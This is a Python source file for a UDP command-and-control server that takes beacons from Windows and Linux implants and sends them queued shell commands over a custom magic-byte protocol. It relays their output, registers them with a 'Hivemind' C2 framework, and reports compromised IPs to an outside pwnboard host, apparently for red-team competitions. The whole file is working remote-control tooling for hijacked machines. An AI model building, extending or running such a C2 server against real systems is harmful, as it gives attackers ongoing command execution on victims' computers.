import datetime
import json
import queue
import socket
import struct
from random import randbytes
from threading import Thread
import requests

from Utils.hivemind import Hivemind, ModuleFunc, Module, Implant, ParamTypes

MAGIC_BYTES = b'\x42\x50\x3c\x33'
REQUEST_BYTE = b'\x01'
RAW_COMMAND_BYTE = b'\x02'
RESPONSE_BYTE = b'\x03'
KEEP_ALIVE_BYTE = b'\x04'
RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'


class BPServer(Thread):
    def __init__(self, listen_port, push_port, rooms, lock, execution_queue, push_queue, hivemind_server=None, hivemind_port=None):
        """
        Create a new udp server
        """
        Thread.__init__(self)
        self.rooms = rooms
        self.lock = lock
        self.is_listening = True
        self.listen_port = listen_port
        self.push_port = push_port
        self.execution_queue = execution_queue
        self.push_queue = push_queue
        self.time_to_wait = 120
        self.time_waiting = datetime.datetime.now()
        self.use_hivemind = False

        ##############################################
        # Hivemind stuff
        if hivemind_server is not None and hivemind_port is not None:
            self.hivemind = Hivemind()
            self.hivemind.set_callback_server(hivemind_server, hivemind_port)
            self.cmd_func_windows = ModuleFunc('cmd', 'Run a executable, ie. cmd.exe /c ipconfig', ['command'], [ParamTypes.STRING])
            self.cmd_func_linux = ModuleFunc('cmd', 'Run a command in linux shell, ie. ip a', ['command'], [ParamTypes.STRING])
            self.mod_windows = Module('Windows BP Command Module', 'Module for running commands', [self.cmd_func_windows])
            self.mod_linux = Module('Linux BP Command Module', 'Module for running commands', [self.cmd_func_linux])
            self.cmd_to_action_id = {}
            self.use_hivemind = True
        ##############################################

    @staticmethod
    def send_update(ip, name="BP"):
        host = "http://pwnboard.win/generic"
        d = {'ip': ip, 'type': name}
        try:
            requests.post(host, json=d, timeout=3)
            return True
        except Exception as E:
            return False

    def run(self):
        """
        Start udp server
        """
        self.sock = socket.socket(socket.AF_INET,
                                  socket.SOCK_DGRAM)
        self.sock.bind(("", self.listen_port))
        self.sock.setblocking(0)
        self.sock.settimeout(.1)
        target_cmds = {}
        while self.is_listening:
            try:
                data, address = self.sock.recvfrom(4096)
            except socket.timeout:
                try:
                    push_stage = self.push_queue.get_nowait()
                except queue.Empty:
                    continue
                for target in push_stage:
                    target_address = bytes(map(int, target.split('.')))
                    for cmd in push_stage[target]:
                        cmd = bytes(cmd, 'utf-8')
                        length = len(cmd).to_bytes(2, byteorder='big')
                        packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + b'\x00\x00\x00\x00' + target_address + length + cmd
                        self.sock.sendto(packet, (target, self.push_port))
                continue
            except:
                continue
            elapsed = (datetime.datetime.now() - self.time_waiting).total_seconds()
            if len(target_cmds) == 0 or elapsed > self.time_to_wait:
                try:
                    target_cmds = self.execution_queue.get_nowait()
                    self.lock.acquire()
                    self.rooms.send(f'QUEUE {self.execution_queue.qsize()}')
                    self.lock.release()
                    self.time_waiting = datetime.datetime.now()
                except queue.Empty:
                    pass
            cur_target = ''
            target_address = bytes(map(int, address[0].split('.')))
            target_os = data[5:6]
            cmd_num = data[6:10]
            if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
                try:
                    cur_target = socket.inet_ntoa(struct.pack('!L', int.from_bytes(data[10:14], byteorder='big')))
                    # self.send_update(cur_target)
                    ##############################################
                    if self.use_hivemind:
                        if target_os == b'\x02':
                            implant = Implant(cur_target, 'C0:FF:33:15:40:0D', 'Windows', 'N/A', 'BP-Windows', '1.0')
                            implant.add_module(self.mod_windows)
                        else:
                            implant = Implant(cur_target, 'C0:FF:33:15:40:0D', 'Linux', 'N/A', 'BP-Linux', '1.0')
                            implant.add_module(self.mod_linux)
                        try:
                            tmp = self.hivemind.implant_callback(cur_target, implant)
                            if tmp is not None:
                                for x in tmp:
                                    gen_cmd_num = randbytes(4)
                                    self.cmd_to_action_id[gen_cmd_num] = x['action_id']
                                    cmd = bytes(json.loads(x['arguments'])['command'], 'utf-8')
                                    length = len(cmd).to_bytes(2, byteorder='big')
                                    packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + gen_cmd_num + target_address + length + cmd
                                    self.sock.sendto(packet, address)
                        except Exception:
                            pass
                    ##############################################

                    for cmd in target_cmds[cur_target]:
                        cmd = bytes(cmd, 'utf-8')
                        length = len(cmd).to_bytes(2, byteorder='big')
                        packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + cmd_num + target_address + length + cmd
                        self.sock.sendto(packet, address)
                    target_cmds.pop(cur_target)
                except KeyError:
                    packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
                    self.sock.sendto(packet, address)
            elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
                cmd_num = data[5:9]
                cur_target = socket.inet_ntoa(struct.pack('!L', int.from_bytes(data[9:13], byteorder='big')))
                response_len = int.from_bytes(data[13:15], byteorder='big')
                response = data[15:15 + response_len].decode('utf-8')
                if self.use_hivemind:
                    try:
                        action_id = self.cmd_to_action_id.pop(cmd_num)
                        self.hivemind.implant_response(cur_target, action_id, response)
                    except Exception:
                        pass
                self.lock.acquire()
                self.rooms.send(f'RESPONSE {cur_target} {response}')
                self.lock.release()
            self.lock.acquire()
            try:
                if cur_target != '':
                    self.rooms.send(f'Target {cur_target}')
            except Exception as e:
                pass
            finally:
                self.lock.release()
        self.stop()

    def stop(self):
        """
        Stop server
        """
        self.sock.close()
